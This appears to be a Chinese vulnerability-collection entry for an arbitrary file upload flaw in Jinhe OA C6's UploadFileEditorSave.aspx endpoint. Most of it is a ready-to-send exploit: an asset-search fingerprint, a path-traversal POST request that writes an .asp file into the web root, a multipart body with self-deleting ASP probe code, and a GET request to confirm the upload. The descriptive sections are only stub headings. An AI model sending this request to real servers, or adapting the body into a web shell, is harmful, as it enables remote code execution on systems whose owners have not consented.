# 金和OAC6UploadFileEditorSave存在任意文件上传漏洞

- **系统**：金和OA　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="金和 OA"`
- **请求**：`POST /C6/Control/UploadFileEditorSave.aspx?filename=\....\....\C6\8tlj8jsoj2.asp HTTP/1.1`
- **关键头**：`Content-Length: 303`　`Content-Type: multipart/form-data; boundary=----3oox7pq44le5x6qwwj8a`

**请求体 / payload**
```
------3oox7pq44le5x6qwwj8a
Content-Disposition: form-data; name="file"; filename="8tlj8jsoj2.jpg"
Content-Type: image/png
<% response.write(111*111)
set myfso=server.CreateObject("scripting.filesystemobject")
myfso.DeleteFile(Server.MapPath("8tlj8jsoj2.asp"))%>
------3oox7pq44le5x6qwwj8a--

上传文件位置
GET /C6/8tlj8jsoj2.asp HTTP/1.1
Host:
Cookie: ASP.NET_SessionId=xzurv45ywzzqpor5nppga4qv
\jinhe-c6-UploadFileEditorSave-f…（脚本共 632 字，完整版见原文）
```

**其他**
- 金和OA C6 UploadFileEditorSave存在任意文件上传漏洞: * [一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 金和OA